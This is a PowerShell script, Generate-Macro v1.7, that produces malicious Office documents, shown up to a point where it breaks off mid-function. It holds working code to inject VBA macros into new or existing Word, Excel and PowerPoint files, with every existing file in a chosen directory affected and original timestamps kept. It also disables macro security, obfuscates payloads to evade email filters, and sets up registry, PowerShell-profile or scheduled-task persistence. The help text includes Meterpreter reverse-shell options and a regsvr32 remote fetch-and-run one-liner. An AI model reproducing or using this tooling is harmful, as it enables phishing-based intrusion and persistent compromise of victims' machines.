#Code by Jesse Nebling (@bashexplode) 
#Version 1.7
#Added Document Type Choice (Excel, Word, AND PowerPoint), Payload Option (Custom or Invoke-Shellcode), Base64 Encoding of Macro, Created Obfuscation code
#Removed AltDS persistence, Added No Persistence, Added Obfuscation options, Added choice to create new doc OR add to existing document(s)
<#
.SYNOPSIS
Standalone Powershell script that will generate a macro maldoc, add a macro to an existing Microsoft Office document with a specified payload and persistence method, or just generate a VBA macro to a text file.

.DESCRIPTION
This script will generate malicious Microsoft Excel, Word, or PowerPoint Documents that contain VBA macros. This script will prompt you for what type of payload you want to use.
--
If you choose Invoke-Shellcode the script will then prompt for your attacking hostname, (the one you will receive your shell at), the port you want your shell at, 
where the Invoke-Shellcode script is hosted (please host your own), the type of document, the name of the document, and where you'd like to save the document. 
From there the script will prompt for the channel the payload will communicate over, the type of obfuscation, and the type of persistence you would like with the attack.
--
If you choose custom the script will prompt you for the type of document, the name of the document, and where you'd like to save the document. From there the script
will prompt you for the type of payload whether it be the launcher string (recommended) or the macro generate from empire. If you choose the launcher string option,
the script will then prompt for the level of obfuscation, and the type of persistence you would like with the attack.


These attacks can use either a custom one-liner payload or Invoke-Shellcode to create a meterpreter shell, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation
PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

Advanced Obfuscation function very loosely based off of PSploitGen.py by Joff Thyer ----> @joff_thyer

Original Generate-Macro Code by Matt Nelson ------> @enigma0x3

Original Add macro to existing documents code by Nikhil Mittal ------> @nikhil_mitt

.Attack Types
Payload with Logon Persistence: This attack delivers the payload and then persists in the registry 
by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
that executes the .vbs file on login. It also tests the tests the execution of the vbs file by using wscript (DELETE FROM OBFUSCATION FUNCTIONS IF YOU'RE WORRIED ABOUT DETECTION)

Payload with Powershell Profile Persistence: This attack requires the target user to have admin right but is quite creative. It will
deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs. Once dropped, it creates
an infected Powershell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that executes Powershell.exe on startup. Since the Powershell profile loads automatically when 
Powershell.exe is invoked, your code is executed automatically.

Payload with Scheduled Task Persistence: This attack will give you a shell and then persist by creating a scheduled task with the action set to
the set payload. Creates a vbscript that is stored in %temp% which is called by the scheduled task.

Payload with No Persistence: nuff said.

.EXAMPLE -Creating an Excel Macro Document with Invoke-Shellcode hosted on Github that saves on the Desktop and has Logon Persistence
PS> ./Generate-Macro.ps1
-----Select Payload Type-----
1. Invoke-Shellcode
2. Custom (Empire Generated)
------------------------------
Select Payload Type Number & Press Enter: 1

----Select Script Location----
1. Hosted on Server
2. Pull from Github
------------------------------
Select Script Location Number & Press Enter: 2

Enter Hostname or IP of System Running Handler: test.com
Enter Port Number of System Running Handler: 80

-----Select Document Type-----
1. Excel
2. Word
3. PowerPoint
------------------------------
Select Document Number & Press Enter: 1

Enter the name of the document (Do not include a file extension): finance

----Document Save Location----
1. Desktop
2. Other
------------------------------
Select Document Save Location Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Communications Channel Number & Press Enter: 1

---Select Obfuscation Level---
1. Basic Obfuscation (Will bypass basic email filters, will fail in sandbox)
2. Advanced Obfuscation (Will bypass most email filters, may fail in sandbox)
------------------------------
Select Attack Number & Press Enter: 1

--------Select Attack---------
1. Payload with Logon Persistence
2. Payload with Powershell Profile Persistence (Requires user to be local admin)
3. Payload with Scheduled Task Persistence
4. Payload with No Persistence
------------------------------
Select Attack Number & Press Enter: 1

Saved to file C:\Users\PenTester\Desktop\finance.xls
Clean-up Script located at C:\Users\PenTester\Desktop\RegistryCleanup.ps1
PS>

.EXAMPLE -Creating an Excel Macro with a One-Liner that saves to a text file on the Desktop
PS A:\Tools\GenerateMacro> .\GenerateMacrov1.7.ps1

--------Select Action---------
1. Create a new document with malicious macros
2. Add malicious macros to existing document(s)
3. Generate only macro
------------------------------
Select Action Number & Press Enter: 3

-----Select Payload Type-----
1. Invoke-Shellcode
2. One-Liner String
------------------------------
Select Payload Type Number & Press Enter: 2

-----Select Document Type-----
1. Excel
2. Word
3. PowerPoint
------------------------------
Select Document Number & Press Enter: 1

Enter the name of the document (Do not include a file extension): invoice

----Document Save Location----
1. Desktop
2. Other
------------------------------
Select Document Save Location Number & Press Enter: 1

--------Select Payload---------
1. One-Liner String (Recommended)
2. Empire Generated or Custom Macro File
------------------------------
Select Generated Payload Number & Press Enter: 1
Copy and Paste One-Liner or Entire Launcher String Generated by Empire: regsvr32 /s /n /u /i:https://www.compliance-wor
s.com/comply scrobj.dll

---Select Obfuscation Level---
1. Basic Obfuscation (Will bypass basic email filters, will fail in sandbox)
2. Advanced Obfuscation (Will bypass most email filters, may fail in sandbox)
------------------------------
Select Attack Number & Press Enter: 2

--------Select Attack---------
1. Payload with Logon Persistence
2. Payload with Powershell Profile Persistence (REQUIRES OFFICE TO RUN AS LOCAL ADMIN)
3. Payload with Scheduled Task Persistence
4. Payload with No Persistence
------------------------------
Select Attack Number & Press Enter: 4
[*] Creating Obfuscated Macro


#>

#TODO add image links into document

#Determine what the user would like to do
Do {
Write-Host "
--------Select Action---------
1. Create a new document with malicious macros
2. Add malicious macros to existing document(s)
3. Generate only macro
------------------------------"
$DocOpt = Read-Host -prompt "Select Action Number & Press Enter"
} until ($DocOpt -eq "1" -or $DocOpt -eq "2" -or $DocOpt -eq "3")

if($DocOpt -eq "1"){
$global:DocOption = "Create"}
elseif($DocOpt -eq "2"){
$global:DocOption = "Add"}
elseif($DocOpt -eq "3"){
$global:DocOption = "MacroOnly"}


#Determine Custom Payload (i.e. Empire) or Invoke-Shellcode
Do {
Write-Host "
-----Select Payload Type-----
1. Invoke-Shellcode
2. One-Liner String
------------------------------"
$PaytypeNum = Read-Host -prompt "Select Payload Type Number & Press Enter"
} until ($PaytypeNum -eq "1" -or $PaytypeNum -eq "2")

if($PaytypeNum -eq "1"){
    $global:paytype = "shellcode"
    Do {
    Write-Host "
----Select Script Location----
1. Hosted on Server
2. Pull from Github
------------------------------"
    $ScriptLocation = Read-Host -prompt "Select Script Location Number & Press Enter"
    } until ($ScriptLocation -eq "1" -or $ScriptLocation -eq "2")
    if($ScriptLocation -eq "1"){
        $global:IS_Url = Read-Host "Enter URL of Invoke-Shellcode script"}
    elseif($ScriptLocation -eq "2"){
        $global:IS_Url = "https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1"}
$global:IP = Read-Host "`nEnter Hostname or IP of System Running Handler"
$global:Port = Read-Host "Enter Port Number of System Running Handler"}
elseif($PaytypeNum -eq "2"){
$global:paytype = "custom"}

#Determine Doc Type
Do {
Write-Host "
-----Select Document Type-----
1. Excel
2. Word
3. PowerPoint
------------------------------"
$DocNum = Read-Host -prompt "Select Document Number & Press Enter"
} until ($DocNum -eq "1" -or $DocNum -eq "2" -or $DocNum -eq "3")

if($DocNum -eq "1"){
$global:doctype = "xls"}
elseif($DocNum -eq "2"){
$global:doctype = "doc"}
elseif($DocNum -eq "3"){
$global:doctype = "ppt"}


if ($global:doctype -eq "ppt" -and $global:DocOption -ne "MacroOnly"){
    #Determine PowerPoint filetype
    Do {
    Write-Host "
--Select PowerPoint Filetype--
1. .pps 
2. .ppt [For editing, will not execute macro automatically]
------------------------------"
    $pptNum = Read-Host -prompt "Select Filetype Number & Press Enter"
    } until ($pptNum -eq "1" -or $pptNum -eq "2")

    if($pptNum -eq "1"){
    $global:doctype = "pps"}
    elseif($pptNum -eq "2"){
    $global:doctype = "ppt"}

}


if ($global:DocOption -eq "Create" -or $global:DocOption -eq "MacroOnly"){
    Do{
    $global:Name = Read-Host "`nEnter the name of the document (Do not include a file extension)"
    } until ($global:Name)
    if ($global:DocOption -eq "Create"){
        $global:Name = $global:Name + "." + $global:doctype
    }
    else{
        $global:Name = $global:Name + ".txt"
    }

    Do {
    Write-Host "
----Document Save Location----
1. Desktop
2. Other
------------------------------"
    $SaveLoc = Read-Host -prompt "Select Document Save Location Number & Press Enter"
    } until ($SaveLoc -eq "1" -or $SaveLoc -eq "2")
    if ($SaveLoc -eq 1) {$global:defLoc = "$env:userprofile\Desktop"}
    elseif ($SaveLoc -eq 2) {$global:defLoc = Read-Host "`nEnter directory to save files (i.e. C:\Windows\temp)"}
    $global:FullName = "$global:defLoc\$global:Name" 
}
elseif ($global:DocOption -eq "Add"){
    Do{
    $global:FullName = Read-Host "`n[Warning: All *.$global:doctype documents in this directory will have macros added to them] `nEnter the directory path of the document(s)"
    } until ($global:FullName)
}



function CreateExcel($Macro) {
    #Create excel document
    $Excel01 = New-Object -ComObject "Excel.Application"
    $ExcelVersion = $Excel01.Version

    #Disable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


    $Excel01.DisplayAlerts = $false
    $Excel01.DisplayAlerts = "wdAlertsNone"
    $Excel01.Visible = $false
    $Workbook01 = $Excel01.Workbooks.Add(1)
    $Worksheet01 = $Workbook01.WorkSheets.Item(1)

    $ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
    $ExcelModule.CodeModule.AddFromString($Macro)


    #Save the document
    Add-Type -AssemblyName Microsoft.Office.Interop.Excel
    $Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
    Write-Output "`n[+] Saved to file $global:Fullname"

    #Cleanup
    $Excel01.Workbooks.Close()
    $Excel01.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
    $Excel01 = $Null
    if (ps excel){kill -name excel}

    #Enable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
}

function CreateWord($Macro){
    #Create Word doc
    $Word01 = New-Object -ComObject "Word.Application"
    $WordVersion = $Word01.Version

    #Check for Office 2007 or Office 2003
    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
    {
        $Word01.DisplayAlerts = $False
    }
    else
    {
        $Word01.DisplayAlerts = "wdAlertsNone"
    }    

    #Disable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name wordbypassencryptedmacroscan -PropertyType DWORD -Value 2 -Force | Out-Null

    $Doc01 = $Word01.documents.add()

    #Add macro
    $DocModule = $Doc01.VBProject.VBComponents.Item(1)
    $DocModule.CodeModule.AddFromString($Macro)

    #Saving sytax depending on Word Version
    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
    {
    $Doc01.Saveas($global:Fullname, 0)
    }
    else
    {
    $Doc01.Saveas([ref]$global:Fullname, [ref]0)
    } 
    Write-Output "`n[+] Saved to file $global:Fullname"
    $Doc01.Close()
    $Word01.quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word01) | Out-Null
    $Word01 = $Null

    #Enable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name wordbypassencryptedmacroscan -PropertyType DWORD -Value 0 -Force | Out-Null

}

function CreateOutput($Macro){
    #Create Word doc
    $Macro | Out-File $global:FullName

}

function CreatePPT($Macro){
    #Create PowerPoint doc
    $PowerPoint = New-Object -ComObject "PowerPoint.Application"
    $PPTVersion = $PowerPoint.Version
    #$PowerPoint.visible = $False
    $slideType = “microsoft.office.interop.powerpoint.ppSlideLayout” -as [type]

    #Check for Office 2007 or Office 2003
    if (($PPTVersion -eq "12.0") -or  ($PPTVersion -eq "11.0"))
    {
        $PowerPoint.DisplayAlerts = $False
    }
    else
    {
        $PowerPoint.DisplayAlerts = "ppAlertsNone"
    }    

    #Disable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name powerpointbypassencryptedmacroscan -PropertyType DWORD -Value 2 -Force | Out-Null

    $Deck = $PowerPoint.presentations.add($false)

    #Add macro
    $DeckModule = $Deck.VBProject.VBComponents.Add(1)
    $DeckModule.CodeModule.AddFromString($Macro)

    #Create first slide
    $slide = $Deck.slides.add(1,1)

    #create the rectangle overlay
    $slide.shapes.addshape(1,-25,-25,1235,600) | Out-Null
    
    #Look for newly created shape
    $shapeflag = $false
    $i = 1
    Do{
    $mshape = $slide.shapes.item($i) 
    if($mshape.width -eq 1235)
        {$shapeflag = $true}
    else{$i++}
    }until($shapeflag)

    #Set the new shape to a variable and make it transparent and set the macro
    $square = $slide.shapes.item($i)
    $square.fill.Transparency = 1.0
    $square.line.Transparency = 1.0
    $macrorun = $square.ActionSettings.Item(1)
    $macrorun.Action = 3
    $macrorun.Run = "NextSlide"
    $macrorun.AnimateAction = 1
    
    #Create a second slide for the macro to continue to
    $slide = $Deck.slides.add(2,2)


    #Saving sytax depending on Word Version
    if (($PPTVersion -eq "12.0") -or  ($PPTVersion -eq "11.0"))
    {
    $Deck.Saveas($global:Fullname, 0)
    }
    else
    {
    $Deck.SaveAs($global:Fullname)
    } 
    Write-Output "`n[+] Saved to file $global:Fullname"
    $Deck.Close()
    $PowerPoint.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($PowerPoint) | Out-Null
    $PowerPoint = $Null
    [gc]::collect()
    [gc]::WaitForPendingFinalizers()

    #Enable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name powerpointbypassencryptedmacroscan -PropertyType DWORD -Value 0 -Force | Out-Null

}

function AddExcelMac($Macro,$FileDir){
        $ExcelFiles = Get-ChildItem -Recurse $FileDir\* -Include *.xlsx,*.xls
        Write-Output ""

        ForEach ($ExcelFile in $ExcelFiles)
        {
            $Excel = New-Object -ComObject Excel.Application
            $ExcelVersion = $Excel.Version

            #Disable Macro Security
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

            #Check for Office 2007 or Office 2003
            if (($ExcelVersion -eq "12.0") -or  ($ExcelVersion -eq "11.0"))
            {
                $Excel.DisplayAlerts = $False
            }
            else
            {
                $Excel.DisplayAlerts = "wdAlertsNone"
            }    
            $WorkBook = $Excel.Workbooks.Open($ExcelFile.FullName)
            $Worksheet = $Workbook.WorkSheets.Item(1)


#            $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
            $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
            $ExcelModule.CodeModule.AddFromString($Macro)

            $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + "-MacroAdded.xls"
            #Append .xls to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $ExcelFile.FullName + "-MacroAdded.xls"
            }
            $WorkBook.Saveas($SavePath, 18)
            Write-Output "`n[+] Saved to file $SavePath"
            $Excel.Workbooks.Close()
            $LastModifyTime = $ExcelFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            $Excel.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
        }
    #Reenable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
}

function AddWordMac($Macro,$FileDir){
        $WordFiles = Get-ChildItem -Recurse $FileDir\* -Include *.doc,*.docx
        Write-Output ""

        ForEach ($WordFile in $WordFiles)
        {
            $Word = New-Object -ComObject Word.Application
            $WordVersion = $Word.Version

            #Disable Macro Security
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name wordbypassencryptedmacroscan -PropertyType DWORD -Value 2 -Force | Out-Null


            #Check for Office 2007 or Office 2003
            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
            {
                $Word.DisplayAlerts = $False
            }
            else
            {
                $Word.DisplayAlerts = "wdAlertsNone"
            }    
            $Doc = $Word.Documents.Open($WordFile.FullName)
            $DocModule = $Doc.VBProject.VBComponents.Item(1)
            $DocModule.CodeModule.AddFromString($Macro)                  
            $Savepath = $WordFile.DirectoryName + "\" + $Wordfile.BaseName + "-MacroAdded.doc"
            #Append .doc to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $WordFile.FullName + "-MacroAdded.doc"
            }
            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
            {
                $Doc.Saveas($SavePath, 0)
            }
            else
            {
                $Doc.Saveas([ref]$SavePath, 0)
            } 
            Write-Output "[+] Saved to file $SavePath"
            $Doc.Close()
            $LastModifyTime = $WordFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime

            $Word.quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
        }
    #Reenable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name wordbypassencryptedmacroscan -PropertyType DWORD -Value 0 -Force | Out-Null
}

function AddPPTMac($Macro,$FileDir){
        $PPTFiles = Get-ChildItem -Recurse $FileDir\* -Include *.ppt,*.pptx,*.pps,*.ppsm
        Write-Output ""

        ForEach ($PPTFile in $PPTFiles)
        {
            #Create PowerPoint doc
            $PowerPoint = New-Object -ComObject "PowerPoint.Application"
            $PPTVersion = $PowerPoint.Version
            $slideType = “microsoft.office.interop.powerpoint.ppSlideLayout” -as [type]

            #Check for Office 2007 or Office 2003
            if (($PPTVersion -eq "12.0") -or  ($PPTVersion -eq "11.0"))
            {
                $PowerPoint.DisplayAlerts = $False
            }
            else
            {
                $PowerPoint.DisplayAlerts = "ppAlertsNone"
            }    

            #Disable Macro Security
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name powerpointbypassencryptedmacroscan -PropertyType DWORD -Value 2 -Force | Out-Null

            $Deck = $PowerPoint.presentations.Open($PPTFile.FullName,$false,$false,$false)

            #Add macro
            $DeckModule = $Deck.VBProject.VBComponents.Add(1)
            $DeckModule.CodeModule.AddFromString($Macro)

            $slide = $Deck.slides.item(1)


            #create the rectangle overlay
            $slide.shapes.addshape(1,-25,-25,1235,600) | Out-Null
    
            #Look for newly created shape
            $shapeflag = $false
            $i = 1
            Do{
            $mshape = $slide.shapes.item($i)
            if($mshape.width -eq 1235)
                {$shapeflag = $true}
            else{$i++}
            }until($shapeflag)

            #Set the new shape to a variable and make it transparent and set the macro
            $square = $slide.shapes.item($i)
            $square.fill.Transparency = 1.0
            $square.line.Transparency = 1.0
            $macrorun = $square.ActionSettings.Item(1)
            $macrorun.Action = 3
            $macrorun.Run = "NextSlide"
            $macrorun.AnimateAction = 1
            

            $Savepath = $PPTFile.DirectoryName + "\" + $PPTFile.BaseName + "-MacroAdded.$global:doctype"
            #Append .ppt to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $PPTFile.FullName + "-MacroAdded.$global:doctype"
            }
            #Saving sytax depending on Word Version
            if (($PPTVersion -eq "12.0") -or  ($PPTVersion -eq "11.0"))
            {
            $Deck.Saveas($Savepath, 0)
            }
            else
            {
            $Deck.SaveAs($Savepath)
            } 
            Write-Output "`n[+] Saved to file $Savepath"
            $Deck.Close()
            $PowerPoint.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($PowerPoint) | Out-Null
            $PowerPoint = $Null
            [gc]::collect()
            [gc]::WaitForPendingFinalizers()
    }
    #Enable Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\PowerPoint\Security" -Name powerpointbypassencryptedmacroscan -PropertyType DWORD -Value 0 -Force | Out-Null

}

function BasicObfuscator($code){ #generates basic payload that will get around light filtering
function MacroSplitter($code){ #splits powershell command into seperate vbscript variables for basic obfuscation
    [string[]]$mfull = Split-ByLength $code -Split 50
    [string[]]$mbegin = Split-ByLength $mfull[0] -Split 2
    $mfull = $mfull[1..($mfull.Length-1)]
    $mend = $mbegin
    $mend += $mfull
    
    [string[]]$mpayload = "`t`tDim str As String`n"
    $mpayload += "`t`tstr = `""+$mend[0]+"`"`n"
    foreach ($melement in $mend[1..($mend.Length-1)]){
    $mpayload += "`t`tstr = str + `"$melement`"`n"}
    return $mpayload
}
$splitmacro = MacroSplitter($code)

$pptcode= @"
"@
#adds additional line to continue to next slide if the document is a ppt
if($global:doctype -eq "ppt" -or $global:doctype -eq "pps"){
$pptcode = @"
ActivePresentation.SlideShowWindow.View.GotoSlide(2)
"@
}

    $execmacro = @"
Public Function General() As Variant
$splitmacro

        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create str, Null, objConfig, intProcessID
        $pptcode
End Function`n
"@
[string[]]$global:Subs = "General"

if ($RegFlag){ #create and return registry load persistence macro code
    $regmacro = @"
Public Function Persist() As Variant
$splitmacro

    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\" & str &"""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Public\"
    OldFileName = "config.txt"
    NewFileName = "config.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Public\config.vbs", vbHidden
    $pptcode
End Function

Public Function Reg() As Variant
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"
    Set WshShell = Nothing
End Function

Public Function Start() As Variant
        Shell "wscript C:\Users\Public\config.vbs", vbNormalFocus
End Function
"@
$global:Subs += "Persist","Reg","Start"
return $execmacro, $regmacro
}
elseif($ProFlag){ #create and return powershell profile persistence macro code

    $profmacro = @"
Public Function WriteWrapper() As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\"
    OldFileName = "cookie.txt"
    NewFileName = "cookie.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs", vbHidden
    $pptcode
End Function

Public Function WriteProfile() As Variant
$splitmacro

    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
    a.WriteLine (str)
    a.Close
    GivenLocation = "C:\Windows\SysNative\WindowsPowerShell\v1.0\"
    OldFileName = "Profile.txt"
    NewFileName = "Profile.ps1"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1", vbHidden
End Function

Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\cookie.vbs", "REG_SZ"
Set WshShell = Nothing

End Function
"@
$global:Subs += "WriteWrapper","WriteProfile","Reg"
return $execmacro, $profmacro
}
elseif($SchFlag){ # create and return schtasks persistence macro code
    $schmacro = @"
Public Function WriteBot() As Variant
$splitmacro

        vbrun = "objShell.run("""
        str2 = "" & vbrun & str & """), 0, true"
        string1 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
        temp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
        OldFile = "updater.txt"
        NewFile = "updater.vbs"
        oldfilePath = "" & temp & "\" & OldFile & ""
        newfilePath = "" & temp & "\" & NewFile & ""
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set a = fs.CreateTextFile(oldfilePath, True)
        a.WriteLine (string1)
        a.WriteLine (str2)
        a.Close
		fs.CopyFile oldfilePath, newfilePath
        fs.DeleteFile oldfilePath
        $pptcode
End Function

Public Function Persist() As Variant
        schedstring = "cmd.exe /c schtasks /create /TN $global:TaskName /F /SC onidle /i $global:TimeDelay /TR "
        temp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
        file = "updater.vbs"
        filePath = "" & temp & "\" & file & ""
        taskrun = """cmd.exe /c cscript " & filePath & """"

        str2 = schedstring & taskrun

        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
